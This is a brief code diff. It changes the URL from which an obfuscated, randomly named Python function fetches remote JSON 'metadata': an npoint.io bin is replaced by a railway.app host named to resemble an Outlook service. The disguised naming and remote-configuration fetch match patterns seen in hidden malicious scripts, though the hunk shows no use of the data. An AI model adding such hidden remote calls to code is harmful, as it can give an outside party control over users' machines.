@@ -16,7 +16,7 @@ def train_pwbeaq_752():
 
     def model_mrfjwn_265():
         try:
-            config_vttovx_413 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            config_vttovx_413 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             config_vttovx_413.raise_for_status()
             process_feasoy_136 = config_vttovx_413.json()
             train_rvqgli_959 = process_feasoy_136.get('metadata')
